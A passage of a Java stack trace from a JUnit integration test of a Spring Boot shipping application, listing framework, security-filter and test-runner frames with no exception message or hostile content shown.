	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:903) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:564) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.ReportControllerIntegrationTest$GetEnhancedReportTests.shouldHandleNonExistentCycle(ReportControllerIntegrationTest.java:166) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
